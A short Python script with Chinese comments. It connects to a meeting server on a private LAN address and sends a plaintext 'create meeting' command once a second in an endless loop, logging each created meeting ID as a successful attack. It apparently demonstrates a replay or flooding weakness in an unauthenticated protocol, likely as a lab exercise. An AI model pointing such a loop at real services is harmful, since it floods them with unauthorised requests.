from socket import *
import time
s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.137.1', 11262))##绑定ip和端口
s.settimeout(5)##设置超时时间
while True:
    time.sleep(1)##设置睡眠，防止电脑内存崩溃
    s.send(b'creat_meetingdmx')##发送明文
    receive_creat = s.recv(1024).decode()##接收服务器消息
    print(receive_creat)
    if receive_creat == 'success_creatdmx':
        receive_id = s.recv(1024).decode()##接收服务器消息
        print('攻击成功，成功创建会议，会议id:', receive_id)
    else:
        print('创建会议失败')